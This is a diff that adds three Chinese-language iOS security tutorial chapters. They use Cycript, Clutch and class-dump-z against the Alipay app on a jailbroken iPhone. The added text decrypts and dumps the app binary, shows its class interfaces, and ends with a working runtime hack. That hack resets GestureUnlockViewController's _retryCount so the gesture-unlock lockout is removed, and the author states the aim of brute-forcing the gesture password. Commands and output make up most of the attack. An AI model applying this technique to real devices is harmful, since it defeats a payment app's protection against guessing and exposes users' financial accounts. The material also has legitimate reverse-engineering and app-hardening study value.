@@ -12,8 +12,10 @@
 * [iOS安全攻防（三）：使用Reveal分析他人app](#markdown-af03)
 
 * [iOS安全攻防（四）：阻止GDB依附](#markdown-af04)
+* [iOS安全攻防（五）：使用Cycript修改支付宝app运行时](#markdown-af05)
+* [iOS安全攻防（六）：使用class-dump-z分析支付宝app](#markdown-af06)
+* [iOS安全攻防（七）：Hack实战——解除支付宝app手势解锁错误次数限制](#markdown-af07) 
 
-* [iOS安全攻防（一）：Hack必备的命令与工具](#markdown-af05)
 
 
 
@@ -366,3 +368,411 @@ dlopen： 当path 参数为0是,他会自动查找 $LD_LIBRARY_PATH,$DYLD_LIBRAR
     }  
 ```
 
+### <a name="markdown-af05"></a>iOS安全攻防（五）：使用Cycript修改支付宝app运行时
+
+Cycript: Objective-JavaScript ，它懂Objective-C，也懂javascript。
+
+ 
+
+我们能够借助Cycript使用Objective-C或者javascript ，给某个正在运行的进程的runtime发送消息。
+
+ 
+
+本文以修改支付宝app界面为例，介绍Cycript的使用方法。
+
+ 
+
+1）安装Cycript
+
+到Cycript官方网站下载资源工具，然后推进已越狱的iPhone中，进行安装：
+
+```
+
+    dpkg -i cycript_0.9.461_iphoneos-arm.deb   
+    dpkg -i libffi_1-3.0.10-5_iphoneos-arm.deb
+    
+```   
+
+
+2）确定支付宝进程
+
+运行支付宝app，然后获取它的进程号
+
+```
+    Primer:/ root# ps aux | grep Portal   
+       
+    mobile     479   0.6  4.3   590776  44956   ??  Ss    5:14PM   0:09.58 /var/mobile/Applications/8723004E-9E54-4B37-856D-86292780E958/Portal.app/Portal   
+    root       497   0.0  0.0   329252    176 s000  R+    5:21PM   0:00.00 grep Portal   
+
+```
+
+
+3）Cycript钩住支付宝进程
+
+
+```
+
+Primer:/ root# cycript -p 479   
+cy# 
+
+
+```
+
+4）获取当前界面的viewController并修改背景色
+
+
+```
+    cy# var app = [UIApplication sharedApplication]   
+    @"<DFApplication: 0x16530660>"   
+       
+    cy# app.delegate   
+    @"<DFClientDelegate: 0x165384d0>"   
+       
+    cy# var keyWindow = app.keyWindow   
+    @"<UIWindow: 0x1654abb0; frame = (0 0; 320 568); gestureRecognizers = <NSArray: 0x1654b190>; layer = <UIWindowLayer: 0x1654ace0>>"   
+       
+    cy# var rootController = keyWindow.rootViewController   
+    @"<DFNavigationController: 0x1654b6c0>"   
+       
+    cy# var visibleController = rootController.visibleViewController   
+    @"<ALPLauncherController: 0x166acfb0>"   
+       
+    cy# visibleController.childViewControllers   
+    @["<HPHomeWidgetGroup: 0x166afbc0>","<ADWRootViewController: 0x165745c0>","<ALPAssetsRootViewController: 0x16577250>","<SWSecurityWidgetGroup: 0x166bd940>"]   
+       
+    cy# var assetsController = new Instance(0x16577250)   
+    @"<ALPAssetsRootViewController: 0x16577250>"   
+       
+    cy# assetsController.view.backgroundColor = [UIColor blueColor]   
+    @"UIDeviceRGBColorSpace 0 0 1 1"   
+   
+   
+
+```
+
+![](./images/4196_140211111114_2.png)
+
+ 当然，只是修改个背景色好没意思……   
+ 
+ 
+### <a name="markdown-af06"></a>iOS安全攻防（六）：使用class-dump-z分析支付宝app
+
+为了了解支付宝app的源码结构，我们可以使用class-dump-z工具来分析支付宝二进制。
+
+ 
+
+1.下载配置class_dump_z
+
+前往 https://code.google.com/p/networkpx/wiki/class_dump_z ，下载tar包，然后解压配置到本地环境
+
+    $ tar -zxvf class-dump-z_0.2a.tar.gz   
+    $ sudo cp mac_x86/class-dump-z /usr/bin/   
+
+ 
+
+2.class_dump支付宝app
+
+    $ class-dump-z Portal > Portal-dump.txt   
+       
+    @protocol XXEncryptedProtocol_10764b0   
+    -(?)XXEncryptedMethod_d109df;   
+    -(?)XXEncryptedMethod_d109d3;   
+    -(?)XXEncryptedMethod_d109c7;   
+    -(?)XXEncryptedMethod_d109bf;   
+    -(?)XXEncryptedMethod_d109b8;   
+    -(?)XXEncryptedMethod_d109a4;   
+    -(?)XXEncryptedMethod_d10990;   
+    -(?)XXEncryptedMethod_d1097f;   
+    -(?)XXEncryptedMethod_d10970;   
+    -(?)XXEncryptedMethod_d10968;   
+    -(?)XXEncryptedMethod_d10941;   
+    -(?)XXEncryptedMethod_d10925;   
+    -(?)XXEncryptedMethod_d10914;   
+    -(?)XXEncryptedMethod_d1090f;   
+    -(?)XXEncryptedMethod_d1090a;   
+    -(?)XXEncryptedMethod_d10904;   
+    -(?)XXEncryptedMethod_d108f9;   
+    -(?)XXEncryptedMethod_d108f4;   
+    -(?)XXEncryptedMethod_d108eb;   
+    @optional   
+    -(?)XXEncryptedMethod_d109eb;   
+    @end   
+
+查看得到的信息是加过密的，这个加密操作是苹果在部署到app store时做的，所以我们还需要做一步解密操作。
+
+ 
+
+3.使用Clutch解密支付宝app
+
+1）下载Clutch
+
+iOS7越狱后的Cydia源里已经下载不到Clutch了，但是我们可以从网上下载好推进iPhone
+
+地址：Clutch传送门
+
+ 
+
+2）查看可解密的应用列表
+
+    root# ./Clutch    
+       
+    Clutch-1.3.2   
+    usage: ./Clutch [flags] [application name] [...]   
+    Applications available: 9P_RetinaWallpapers breadtrip Chiizu CodecademyiPhone FisheyeFree food GirlsCamera IMDb InstaDaily InstaTextFree iOne ItsMe3 linecamera Moldiv MPCamera MYXJ NewsBoard Photo Blur Photo Editor PhotoWonder POCO相机 Portal QQPicShow smashbandits Spark tripcamera Tuding_vITC_01 wantu WaterMarkCamera WeiBo Weibo     
+
+ 
+
+3）解密支付宝app
+
+    root# ./Clutch Portal   
+       
+    Clutch-1.3.2   
+    Cracking Portal...   
+    Creating working directory...   
+    Performing initial analysis...   
+    Performing cracking preflight...   
+    dumping binary: analyzing load commands   
+    dumping binary: obtaining ptrace handle   
+    dumping binary: forking to begin tracing   
+    dumping binary: successfully forked   
+    dumping binary: obtaining mach port   
+    dumping binary: preparing code resign   
+    dumping binary: preparing to dump   
+    dumping binary: ASLR enabled, identifying dump location dynamically   
+    dumping binary: performing dump   
+    dumping binary: patched cryptid   
+    dumping binary: writing new checksum   
+    Censoring iTunesMetadata.plist...   
+    Packaging IPA file...   
+       
+    compression level: 0   
+        /var/root/Documents/Cracked/支付宝钱包-v8.0.0-(Clutch-1.3.2).ipa   
+       
+    elapsed time: 7473ms   
+       
+    Applications Cracked:    
+    Portal   
+       
+    Applications that Failed:   
+       
+    Total Success: 1 Total Failed: 0   
+
+ 
+
+4）导出已解密的支付宝app
+
+从上一步骤得知，已解密的ipa位置为：/var/root/Documents/Cracked/支付宝钱包-v8.0.0-(Clutch-1.3.2).ipa
+
+将其拷贝到本地去分析
+
+ 
+
+4.class_dump已解密的支付宝app
+
+解压.ipa后，到 支付宝钱包-v8.0.0-(Clutch-1.3.2)/Payload/Portal.app 目录下，class_dump已解密的二进制文件
+
+    $ class-dump-z Portal > ~/Portal-classdump.txt   
+
+这回就可以得到对应的信息了：
+
+    @protocol ALPNumPwdInputViewDelegate <NSObject>   
+    -(void)onPasswordDidChange:(id)onPassword;   
+    @end   
+       
+    @protocol ALPContactBaseTableViewCellDelegate <NSObject>   
+    -(void)shareClicked:(id)clicked sender:(id)sender;   
+    @end   
+       
+    @interface MMPPayWayViewController : XXUnknownSuperclass <SubChannelSelectDelegate, UITableViewDataSource, UITableViewDelegate, CellDelegate, UIAlertViewDelegate> {   
+    @private   
+        Item* channelSelected;   
+        BOOL _bCheck;   
+        BOOL _bOpenMiniPay;   
+        BOOL _bNeedPwd;   
+        BOOL _bSimplePwd;   
+        BOOL _bAutopayon;   
+        BOOL _bHasSub;   
+        BOOL _bFirstChannel;   
+        BOOL _bChangeSub;   
+        BOOL _bClickBack;   
+        UITableView* _channelListTableView;   
+        NSMutableArray* _channelListArray;   
+        NSMutableArray* _subChanneSelectedlList;   
+        NSMutableArray* _unCheckArray;   
+        UIButton* _saveButton;   
+        UILabel* _tipLabel;   
+        MMPPasswordSwichView* _payWaySwitch;   
+        MMPPopupAlertView* _alertView;   
+        UIView* _setView;   
+        int _originalSelectedRow;   
+        int _currentSelectedRow;   
+        NSString* _statusCode;   
+        ChannelListModel* _defaultChannelList;   
+    }   
+    @property(assign, nonatomic) BOOL bClickBack;   
+    @property(retain, nonatomic) ChannelListModel* defaultChannelList;   
+    @property(retain, nonatomic) NSString* statusCode;   
+    @property(assign, nonatomic) int currentSelectedRow;   
+    @property(assign, nonatomic) int originalSelectedRow;   
+    @property(retain, nonatomic) UIView* setView;   
+    @property(retain, nonatomic) MMPPopupAlertView* alertView;   
+    @property(retain, nonatomic) MMPPasswordSwichView* payWaySwitch;   
+    @property(assign, nonatomic, getter=isSubChannelChanged) BOOL bChangeSub;   
+    @property(assign, nonatomic) BOOL bFirstChannel;   
+    @property(assign, nonatomic) BOOL bHasSub;   
+    @property(assign, nonatomic) BOOL bAutopayon;   
+    @property(assign, nonatomic) BOOL bSimplePwd;   
+    @property(assign, nonatomic) BOOL bNeedPwd;   
+    @property(assign, nonatomic) BOOL bOpenMiniPay;   
+    @property(assign, nonatomic) BOOL bCheck;   
+    @property(retain, nonatomic) UILabel* tipLabel;   
+    @property(retain, nonatomic) UIButton* saveButton;   
+    @property(retain, nonatomic) NSMutableArray* unCheckArray;   
+    @property(retain, nonatomic) NSMutableArray* subChanneSelectedlList;   
+    @property(retain, nonatomic) NSMutableArray* channelListArray;   
+    @property(retain, nonatomic) UITableView* channelListTableView;   
+    -(void).cxx_destruct;   
+    -(void)subChannelDidSelected:(id)subChannel;   
+    -(void)switchCheckButtonClicked:(id)clicked;   
+    -(void)checkboxButtonClicked:(id)clicked;   
+    -(void)onCellClick:(id)click;   
+    -(void)showSubChannels;   
+    -(void)tableView:(id)view didSelectRowAtIndexPath:(id)indexPath;   
+    -(id)tableView:(id)view cellForRowAtIndexPath:(id)indexPath;   
+    -(int)tableView:(id)view numberOfRowsInSection:(int)section;   
+    -(float)tableView:(id)view heightForRowAtIndexPath:(id)indexPath;   
+    -(int)numberOfSectionsInTableView:(id)tableView;   
+    -(void)setTableViewFootView:(id)view;   
+    -(void)setTableViewHeaderView:(id)view;   
+    -(id)tableView:(id)view viewForHeaderInSection:(int)section;   
+    -(id)tableView:(id)view viewForFooterInSection:(int)section;   
+    -(float)tableView:(id)view heightForHeaderInSection:(int)section;   
+    -(float)tableView:(id)view heightForFooterInSection:(int)section;   
+    -(void)alertView:(id)view clickedButtonAtIndex:(int)index;   
+    -(void)clickSave;   
+    -(void)netWorkRequestWithPwd:(id)pwd;   
+    -(void)setPayWaySwitchStates:(id)states;   
+    -(void)changePayWaySwitch:(id)aSwitch;   
+    -(void)scrollToSelectedRow;   
+    -(void)didReceiveMemoryWarning;   
+    -(void)viewDidLoad;   
+    -(void)applicationEnterBackground:(id)background;   
+    -(void)dealloc;   
+    -(void)goBack;   
+    -(BOOL)isChannelsSetChanged;   
+    -(id)subChannelCode:(int)code;   
+    -(id)subChannelDesc:(int)desc;   
+    -(id)initWithDefaultData:(id)defaultData;   
+    -(id)initWithNibName:(id)nibName bundle:(id)bundle;   
+    -(void)commonInit:(id)init;   
+    @end   
+
+5.分析支付宝源码片段
+
+1）使用了@private关键字限制成员访问权限
+
+但是实际上，在Objective-C编程中，使用@private连Keypath访问都拦不住的
+
+ 
+
+2）抛出了冗长的成员对象
+
+这非常有利分析程序结构
+
+ 
+
+6.进一步思考
+
+1）如何利用 class-dump 结果，结合 cycript 进行攻击呢？
+
+2）class-dump-z 如此强大，有什么方法可以减少暴露的信息吗？
+
+### <a name="markdown-af07"></a>Hack实战——解除支付宝app手势解锁错误次数限制
+
+
+之前仅仅介绍了工具的使用，本文将实践一下如何利用 cycript 结合 class-dump 结果hack，还要牺牲一下支付宝app。
+
+ 
+
+首先，老套路，取到手势解锁界面的View Controller:
+
+    cy# var app = [UIApplication sharedApplication]   
+    @"<DFApplication: 0x1666c960>"   
+    cy# var keyWindow = app.keyWindow   
+    @"<UIWindow: 0x16591bd0; frame = (0 0; 320 568); gestureRecognizers = <NSArray: 0x1b047000>; layer = <UIWindowLayer: 0x165d0650>>"   
+    cy# var root = keyWindow.rootViewController   
+    @"<UINavigationController: 0x179779a0>"   
+    cy# var visible = root.visibleViewController   
+    @"<GestureUnlockViewController: 0x165de090>"   
+
+ 然后，对照class-dump-z结果，来分析 GestureUnlockViewController 有什么利用价值 ：
+
+    @interface GestureUnlockViewController : DTViewController <UIAlertViewDelegate, GestureHeadImageViewDelegate> {   
+    @private   
+        GestureHeadImageView* _headImageView;   
+        GestureTipLabel* _tipLabel;   
+        GestureInputView* _inputView;   
+        DTButton* _forgetButton;   
+        DTButton* _changeAccountButton;   
+        int _retryCount;   
+        UIView* _guideView;   
+        id<GestrueViewControllerDelegate> _delegate;   
+    }   
+    @property(assign, nonatomic) __weak id<GestrueViewControllerDelegate> delegate;   
+    -(void).cxx_destruct;   
+    -(BOOL)shouldAutorotateToInterfaceOrientation:(int)interfaceOrientation;   
+    -(void)headClicked;   
+    -(void)gestureInputView:(id)view didFinishWithPassword:(id)password;   
+    -(void)gestureInputViewFirstEffectiveTouch:(id)touch;   
+    -(void)alertView:(id)view clickedButtonAtIndex:(int)index;   
+    -(void)actionChangeAccountToLogin;   
+    -(void)actionResetPswBtnClick;   
+    -(void)resetCurrentUser;   
+    -(void)resetPsw;   
+    -(void)viewWillDisappear:(BOOL)view;   
+    -(void)notifyFaceToFacePayReceivedData:(id)facePayReceivedData;   
+    -(void)viewWillAppear:(BOOL)view;   
+    -(void)breakFirstRun;   
+    -(BOOL)isFirstRun;   
+    -(void)guideViewClicked:(id)clicked;   
+    -(void)viewDidLoad;   
+    -(void)viewWillLayoutSubviews;   
+    @end   
+
+ 目测 _tipLabel 是写账户名和提示操作的label，上篇文章我提到过：@private限制不了keyPath，现在我们来修改一下支付宝登录页的用户名信息：
+
+    cy# [visible setValue:@"Test By yiyaaixuexi" forKeyPath:@"_tipLabel.text"]   
+
+
+
+![](./images/4196_140211112011_1.png)
+
+
+支付宝手势密码解锁有尝试次数限制，连续错5次就要重新登录。
+
+
+ 
+
+我想解除重试解锁次数的限制，发现了记录解锁次数的类型是int，int _retryCount ，这一点让我很不开心，因为我无法通过KVC来修改其值了。
+
+ 
+
+但是没有关系，我可以通过指针访问：
+
+    cy# visible->_retryCount = 0   
+    0   
+
+ 
+
+这样我就能无限制的用程序暴力破解手势密码了，来计算一下有多少种可能呢？
+
+这个数字对我来说有点大，可是对iPhone5的CPU来说就是小菜一碟了～
+
+ 
+
+等一下，密码格式是什么呢？
+
+    -(void)gestureInputView:(id)view didFinishWithPassword:(id)password;   
+
+id类型的密码，很严谨，又给hack带来不少麻烦呀～
+ 
